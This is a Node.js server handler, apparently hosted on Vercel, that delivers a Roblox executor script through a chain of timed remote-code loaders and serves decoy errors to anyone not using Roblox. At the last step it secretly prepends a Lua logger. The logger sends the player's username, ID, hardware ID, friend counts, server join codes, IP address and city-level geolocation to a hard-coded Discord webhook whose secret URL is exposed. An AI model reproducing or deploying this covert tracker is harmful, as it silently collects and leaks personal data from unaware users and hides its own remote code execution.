const https = require('https');

// ============================
// SETTINGS
// ============================
const SETTINGS = {
    WEBHOOK: "https://discord.com/api/webhooks/1452653310443257970/SkdnTLTdZUq5hJUf7POXHYcILxlYIVTS7TVc-NYKruBSlotTJtA2BzHY9bEACJxrlnd5",
    TOTAL_LAYERS: 5,
    MIN_WAIT: 112, 
    MAX_WAIT: 119, 
    SESSION_EXPIRY: 10000, 
    KEY_LIFETIME: 5000,   
    // URL SUMBER RAW GITHUB
    PLAIN_TEXT_URL: "https://pastefy.app/cMzbfLvJ/raw",
    REAL_SCRIPT_URL: "https://api.rubis.app/v2/scrap/bMUJDedIAAvDDdeW/raw"
};

// ==========================================
// MEMORY STORAGE
// ==========================================
let sessions = {}; 
let blacklist = {}; 

// ==========================================
// HELPER: FETCH DATA DARI GITHUB
// ==========================================
function fetchRaw(url) {
    return new Promise((resolve) => {
        https.get(url, (res) => {
            let data = '';
            res.on('data', (chunk) => { data += chunk; });
            res.on('end', () => resolve(data.trim()));
        }).on('error', () => resolve(null));
    });
}

// ==========================================
// FUNGSI UNTUK MENGHASILKAN ERROR ACAK
// ==========================================
function getRandomError() {
    const errorCodes = [400, 401, 403, 404, 500, 502, 503];
    return errorCodes[Math.floor(Math.random() * errorCodes.length)];
}

// ==========================================
// FUNGSI WEBHOOK EMBED (HANYA UNTUK SECURITY/DETECTION)
// ==========================================
function getWIBTime() {
    return new Intl.DateTimeFormat('id-ID', {
        timeZone: 'Asia/Jakarta',
        dateStyle: 'medium',
        timeStyle: 'medium'
    }).format(new Date());
}

async function sendWebhookLog(message) {
    const data = JSON.stringify({ 
        embeds: [{
            title: "❗️Ndraawz Security❗️",
            description: message,
            color: 0xff0000,
            footer: { text: "Ndraawz Security | WIB: " + getWIBTime() }
        }]
    });

    const url = new URL(SETTINGS.WEBHOOK);
    const options = {
        hostname: url.hostname,
        path: url.pathname,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(data)
        }
    };

    return new Promise(function(resolve) {
        const req = https.request(options, function(res) {
            res.on('data', function(chunk) {});
            res.on('end', function() { resolve(true); });
        });
        req.on('error', function() { resolve(false); });
        req.write(data);
        req.end();
    });
}

// ==========================================
// SCRIPT LOGGER YANG AKAN DIKIRIM KE CLIENT
// (TANPA AMBIL IP - biar URL IP gak keliatan)
// ==========================================
function getLoggerScript() {
    return `
-- ==========================================
-- LOGGER OTOMATIS DARI SERVER
-- IP akan diambil oleh server, client TIDAK ambil IP
-- ==========================================
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local RbxAnalytics = game:GetService("RbxAnalyticsService")
local LocalizationService = game:GetService("LocalizationService")

local LocalPlayer = Players.LocalPlayer
local Name = LocalPlayer.Name
local DName = LocalPlayer.DisplayName
local UserId = LocalPlayer.UserId
local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
local CountryCode = LocalizationService.RobloxLocaleId

local GetHwid = "Not Supported"
pcall(function() GetHwid = RbxAnalytics:GetClientId() end)

local FriendsCount, FollowersCount, FollowingCount = "0", "0", "0"
pcall(function()
    FriendsCount = HttpService:JSONDecode(game:HttpGet("https://friends.roblox.com/v1/users/"..UserId.."/friends/count")).count
    FollowersCount = HttpService:JSONDecode(game:HttpGet("https://friends.roblox.com/v1/users/"..UserId.."/followers/count")).count
    FollowingCount = HttpService:JSONDecode(game:HttpGet("https://friends.roblox.com/v1/users/"..UserId.."/followings/count")).count
end)

local TotalDays = LocalPlayer.AccountAge
local Years = math.floor(TotalDays / 365)
local Months = math.floor((TotalDays % 365) / 30)
local AgeFormatted = string.format("%d Hari / %d Bulan / %d Tahun", TotalDays, Months, Years)

local MonthsList = {"Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"}
local DateTable = os.date("*t")
local ExecutedTime = string.format("%d %s %d | %02d:%02d:%02d", DateTable.day, MonthsList[DateTable.month], DateTable.year, DateTable.hour, DateTable.min, DateTable.sec)

local GameName = "Unknown"
pcall(function() GameName = MarketplaceService:GetProductInfo(game.PlaceId).Name end)
local JobId = game.JobId
local PlaceId = game.PlaceId
local PlayerCount = #Players:GetPlayers() .. "/" .. Players.MaxPlayers

local JoinCode = string.format("Roblox.GameLauncher.joinGameInstance(%d, '%s')", PlaceId, JobId)
local JoinScript = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s", game.Players.LocalPlayer)', PlaceId, JobId)

local function GetExecutor()
    if identifyexecutor then return identifyexecutor() end
    if syn then return "Synapse X" end
    return "Unknown"
end
local Executor = GetExecutor()

local fields = {
    { name = "━━━━━━━━━━━━━━ 📋 PLAYER INFO ━━━━━━━━━━━━━━", value = "ㅤ", inline = false },
    { name = "📛 Display Name", value = DName, inline = false },
    { name = "👤 Username", value = Name, inline = false },
    { name = "🆔 User ID", value = tostring(UserId), inline = false },
    { name = "💎 Membership", value = MembershipType, inline = false },
    { name = "🎂 Account Age", value = AgeFormatted, inline = false },
    { name = "👥 Friends/Followers/Following", value = FriendsCount.."/"..FollowersCount.."/"..FollowingCount, inline = false },
    { name = "🚩 Locale", value = CountryCode, inline = false },
    { name = "⚙️ Executor", value = Executor, inline = false },
    { name = "💻 HWID", value = GetHwid, inline = false },
    { name = "⏰ Executed Time", value = ExecutedTime, inline = false },
    { name = "━━━━━━━━━━━━━━ 🎮 SERVER INFO ━━━━━━━━━━━━━━", value = "ㅤ", inline = false },
    { name = "🎮 Game", value = GameName, inline = false },
    { name = "🆔 Place ID", value = tostring(PlaceId), inline = false },
    { name = "👥 Players", value = PlayerCount, inline = false },
    { name = "🔑 Job ID", value = JobId, inline = false },
    { name = "📜 Console Join", value = JoinCode, inline = false },
    { name = "📜 Executor Join", value = JoinScript, inline = false }
}

-- Kirim ke server (tanpa IP, server yang akan ambil IP)
local requestFunc = (syn and syn.request) or (http_request) or (request) or (HttpPost)
if requestFunc then
    local success, err = pcall(function()
        requestFunc({
            Url = "https://ndraawzz-developer.vercel.app/api/log",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({ fields = fields })
        })
    end)
    if not success then
        warn("Gagal kirim log: " .. tostring(err))
    end
else
    warn("Tidak ada fungsi request")
end
`;
}

// ==========================================
// ENDPOINT LOGGER (dipanggil dari client)
// ==========================================
async function handleLog(req, res) {
    let body = '';
    await new Promise((resolve) => {
        req.on('data', chunk => { body += chunk; });
        req.on('end', resolve);
    });
    
    // Ambil IP dari header request (bukan dari client!)
    const clientIp = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || "unknown";
    const cleanIp = clientIp.replace('::ffff:', '');
    
    try {
        const data = JSON.parse(body);
        
        // Ambil geolokasi dari IP (via server, client gak tahu URL nya)
        let geoData = { country: "N/A", region: "N/A", city: "N/A", isp: "N/A", as: "N/A", org: "N/A" };
        
        await new Promise((resolve) => {
            https.get(`https://ipwhois.io/json/${cleanIp}`, (geoRes) => {
                let geoBody = '';
                geoRes.on('data', chunk => geoBody += chunk);
                geoRes.on('end', () => {
                    try {
                        const json = JSON.parse(geoBody);
                        if (json && json.success !== false && json.country) {
                            geoData = {
                                country: json.country || "N/A",
                                region: json.region || "N/A",
                                city: json.city || "N/A",
                                isp: json.isp || "N/A",
                                as: json.asn || "N/A",
                                org: json.org || "N/A"
                            };
                        }
                    } catch(e) {}
                    resolve();
                });
            }).on('error', () => resolve());
        });
        
        // Gabungkan fields dari client + IP dari server
        const allFields = [
            ...(data.fields || []),
            { name: "━━━━━━━━━━━━━━ 🌐 IP INFORMATION (SERVER) ━━━━━━━━━━━━━━", value: "ㅤ", inline: false },
            { name: "📡 IP Address", value: cleanIp, inline: false },
            { name: "🚩 Country", value: geoData.country, inline: false },
            { name: "📍 Region", value: geoData.region, inline: false },
            { name: "🏙️ City", value: geoData.city, inline: false },
            { name: "🏢 ISP", value: geoData.isp, inline: false },
            { name: "📡 AS / Org", value: geoData.as + " / " + geoData.org, inline: false }
        ];
        
        const embed = {
            title: "🚀 Ndraawz Logger",
            color: 0x00ff88,
            fields: allFields,
            timestamp: new Date().toISOString()
        };
        
        // Kirim ke Discord
        await sendWebhookLogEmbed(embed);
        console.log(`✅ Log terkirim untuk IP: ${cleanIp}`);
        res.status(200).json({ ok: true });
        
    } catch (err) {
        console.error("Error handleLog:", err);
        res.status(500).json({ error: err.message });
    }
}

// Fungsi kirim embed ke Discord
async function sendWebhookLogEmbed(embed) {
    const data = JSON.stringify({ embeds: [embed] });
    const url = new URL(SETTINGS.WEBHOOK);
    const options = {
        hostname: url.hostname,
        path: url.pathname,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(data)
        }
    };
    
    return new Promise((resolve) => {
        const req = https.request(options, (res) => {
            res.on('data', () => {});
            res.on('end', () => resolve(true));
        });
        req.on('error', () => resolve(false));
        req.write(data);
        req.end();
    });
}

// ==========================================
// MAIN HANDLER (ANTI-CURI 5 LAYER)
// ==========================================
module.exports = async function(req, res) {
    const url = req.url || "";
    
    // Endpoint untuk logger
    if (url === '/api/log' && req.method === 'POST') {
        return handleLog(req, res);
    }
    
    // ========== ANTI-CURI 5 LAYER ==========
    res.setHeader('Content-Type', 'text/plain');
    
    const now = Date.now();
    const ip = req.headers['x-real-ip'] || req.headers['x-forwarded-for']?.split(',')[0] || "unknown";
    const agent = req.headers['user-agent'] || "";
    
    // Gatekeeper: hanya Roblox yang boleh akses
    const isRoblox = agent.includes("Roblox") && 
                     (req.headers['roblox-id'] || req.headers['x-roblox-place-id'] || agent.includes("RobloxApp"));
    
    // Blokir Discord Bot
    const isDiscord = agent.includes("Discordbot");
    
    if (!isRoblox || isDiscord || blacklist[ip] === true) {
        const plainResp = await fetchRaw(SETTINGS.PLAIN_TEXT_URL);
        return res.status(getRandomError()).send(plainResp || "SECURITY : BANNED ACCESS!");
    }
    
    // Parsing URL (step, id, key)
    const urlParts = req.url.split('?');
    const queryString = urlParts[1] || "";
    const params = queryString.split('.');
    
    const step = params[0]; 
    const id = params[1];   
    const key = params[2];  
    
    const currentStep = parseInt(step) || 0;
    const host = req.headers.host;
    const currentPath = urlParts[0];
    
    try {
        // Handshake validation untuk step > 0
        if (currentStep > 0) {
            const session = sessions[id];
            
            // Cek apakah sesi ada
            if (session === undefined || session.ownerIP !== ip) {
                const plainResp = await fetchRaw(SETTINGS.PLAIN_TEXT_URL);
                return res.status(getRandomError()).send(plainResp || "SECURITY : BANNED ACCESS!");
            }
            
            // Validasi urutan step random
            const expectedStep = session.stepSequence[session.currentIndex];
            if (currentStep !== expectedStep) {
                delete sessions[id];
                return res.status(getRandomError()).send("SECURITY : BANNED ACCESS!");
            }
            
            // One-time use check
            if (session.used === true) {
                blacklist[ip] = true;
                await sendWebhookLog("🚫 **REPLAY ATTACK**\n**IP:** `" + ip + "` mencoba akses ulang link mati.");
                return res.status(getRandomError()).send("SECURITY : BANNED ACCESS!");
            }
            
            // Expiry check
            const sessionDuration = now - session.startTime;
            const keyDuration = now - session.keyCreatedAt;
            if (sessionDuration > SETTINGS.SESSION_EXPIRY || keyDuration > SETTINGS.KEY_LIFETIME) {
                delete sessions[id];
                return res.status(getRandomError()).send("SECURITY : BANNED ACCESS!");
            }
            
            // Key & timing handshake
            if (session.nextKey !== key) {
                delete sessions[id];
                return res.status(getRandomError()).send("SECURITY : BANNED ACCESS!");
            }
            
            const timeSinceLastRequest = now - session.lastTime;
            if (timeSinceLastRequest < session.requiredWait) {
                blacklist[ip] = true;
                delete sessions[id];
                await sendWebhookLog("🚫 **DETECT BOT**\n**IP:** `" + ip + "` timing violation (No Tolerance).");
                return res.status(getRandomError()).send("SECURITY : BANNED ACCESS!");
            }
            session.used = true;
        }
        
        // Inisialisasi sesi pertama (step 0)
        if (currentStep === 0) {
            const ipPart = ip.split('.').pop() || "0";
            const seed = parseInt(ipPart) + Math.floor(Math.random() * 10000);
            const newSessionID = seed.toString(36).substring(0, 4).padEnd(4, 'x');
            
            const nextKey = Math.random().toString(36).substring(2, 8);
            const waitTime = Math.floor(Math.random() * (SETTINGS.MAX_WAIT - SETTINGS.MIN_WAIT)) + SETTINGS.MIN_WAIT;
            
            let sequence = [];
            while(sequence.length < SETTINGS.TOTAL_LAYERS) {
                let r = Math.floor(Math.random() * 300) + 1;
                if(!sequence.includes(r)) sequence.push(r);
            }
            
            sessions[newSessionID] = { 
                ownerIP: ip, 
                stepSequence: sequence,
                currentIndex: 0,
                nextKey: nextKey, 
                lastTime: now, 
                startTime: now, 
                keyCreatedAt: now, 
                requiredWait: waitTime, 
                used: false 
            };
            
            const firstStep = sequence[0];
            const nextUrl = "https://" + host + currentPath + "?" + firstStep + "." + newSessionID + "." + nextKey;
            
            const luaScript = "task.wait(" + (waitTime / 1000) + ") loadstring(game:HttpGet(\"" + nextUrl + "\"))()";
            return res.status(200).send(luaScript);
        }
        
        // Rotasi ghost ID (middle layers)
        if (sessions[id].currentIndex < SETTINGS.TOTAL_LAYERS - 1) {
            const session = sessions[id];
            session.currentIndex++; 
            
            const ipPart = ip.split('.').pop() || "0";
            const seed = parseInt(ipPart) + Math.floor(Math.random() * 10000);
            const newSessionID = seed.toString(36).substring(0, 4).padEnd(4, 'x');
            
            const nextStepNumber = session.stepSequence[session.currentIndex];
            const nextKey = Math.random().toString(36).substring(2, 8); 
            const waitTime = Math.floor(Math.random() * (SETTINGS.MAX_WAIT - SETTINGS.MIN_WAIT)) + SETTINGS.MIN_WAIT;
            
            sessions[newSessionID] = { 
                ownerIP: session.ownerIP,
                stepSequence: session.stepSequence,
                currentIndex: session.currentIndex,
                nextKey: nextKey, 
                lastTime: now, 
                startTime: session.startTime, 
                keyCreatedAt: now, 
                requiredWait: waitTime, 
                used: false 
            };
            
            delete sessions[id]; 
            
            const nextUrl = "https://" + host + currentPath + "?" + nextStepNumber + "." + newSessionID + "." + nextKey;
            const luaScript = "task.wait(" + (waitTime / 1000) + ") loadstring(game:HttpGet(\"" + nextUrl + "\"))()";
            
            return res.status(200).send(luaScript);
        }
        
        // ========== LAYER TERAKHIR: KIRIM LOGGER + SCRIPT UTAMA ==========
        // HAPUS sendWebhookLog sukses! Biar tidak mengirim log kosong.
        // Yang mengirim log player adalah logger script, BUKAN dari sini.
        if (sessions[id].currentIndex === SETTINGS.TOTAL_LAYERS - 1) {
            // Ambil script utama dari REAL_SCRIPT_URL
            const mainScript = await fetchRaw(SETTINGS.REAL_SCRIPT_URL);
            
            // Gabungkan logger script + main script
            const finalScript = getLoggerScript() + "\n\n-- ==========================================\n-- MAIN SCRIPT (DARI GITHUB)\n-- ==========================================\n\n" + (mainScript || 'print("Error: Gagal load script utama")');
            
            delete sessions[id];
            return res.status(200).send(finalScript);
        }
        
    } catch (err) {
        const plainResp = await fetchRaw(SETTINGS.PLAIN_TEXT_URL);
        return res.status(getRandomError()).send(plainResp || "SECURITY : BANNED ACCESS!");
    }
};
